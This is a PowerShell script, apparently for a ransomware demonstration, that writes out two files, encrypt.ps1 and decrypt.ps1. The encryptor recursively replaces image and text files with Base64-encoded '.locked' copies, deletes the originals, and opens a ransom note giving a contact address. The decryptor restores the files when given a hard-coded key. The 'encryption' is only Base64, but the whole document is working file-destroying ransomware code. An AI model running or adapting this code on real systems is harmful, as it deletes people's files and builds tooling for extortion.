Write-Host "[*] Provisioning attack tools..." -ForegroundColor Gray

# --- DEFINING THE ENCRYPTOR CODE ---
$encCode = '
param([string]$Target = ".\", [string]$SecretKey = "AI-DEMO-2026")
$ResolvedPath = (Resolve-Path $Target).Path
$ransomNotePath = Join-Path $ResolvedPath "READ_ME_NOW.txt"

Write-Host "[!] TARGET ACQUIRED: $ResolvedPath" -ForegroundColor Red

# Exclude the note and already locked files
Get-ChildItem -Path $ResolvedPath -Include *.jpg,*.png,*.txt -Exclude "READ_ME_NOW.txt","*.locked" -Recurse | ForEach-Object {
    $content = [System.IO.File]::ReadAllBytes($_.FullName)
    $encoded = [System.Convert]::ToBase64String($content)
    $encoded | Set-Content ($_.FullName + ".locked")
    Remove-Item $_.FullName
    Write-Host "LOCKED: $($_.Name)" -ForegroundColor Yellow
}

$noteContent = "YOUR FILES ARE ENCRYPTED.`r`nTARGET: $ResolvedPath`r`nKEY ID: $SecretKey`r`nCONTACT: ATTACKER@DARKWEB.COM"
$noteContent | Set-Content $ransomNotePath
Start-Process notepad.exe $ransomNotePath
'

# --- DEFINING THE DECRYPTOR CODE ---
$decCode = '
param([string]$Key, [string]$Target = ".\")
$ResolvedPath = (Resolve-Path $Target).Path

if ($Key -eq "AI-DEMO-2026") {
    Write-Host "[+] Key Validated. Scanning $ResolvedPath..." -ForegroundColor Green
    Get-ChildItem -Path $ResolvedPath -Filter *.locked -Recurse | ForEach-Object {
        try {
            $encoded = Get-Content $_.FullName -ErrorAction Stop
            $decoded = [System.Convert]::FromBase64String($encoded)
            $originalName = $_.FullName.Replace(".locked", "")
            [System.IO.File]::WriteAllBytes($originalName, $decoded)
            Remove-Item $_.FullName
            Write-Host "RESTORED: $(Split-Path $originalName -Leaf)" -ForegroundColor Cyan
        } catch {
            Write-Host "[!] Skipping corrupted file: $($_.Name)" -ForegroundColor Red
        }
    }
} else {
    Write-Host "[-] ACCESS DENIED. WRONG KEY." -ForegroundColor Red
}
'

# --- WRITING FILES TO DISK ---
[System.IO.File]::WriteAllText("$PWD\encrypt.ps1", $encCode)
[System.IO.File]::WriteAllText("$PWD\decrypt.ps1", $decCode)

Write-Host "[+] Tools extracted: encrypt.ps1, decrypt.ps1" -ForegroundColor Green
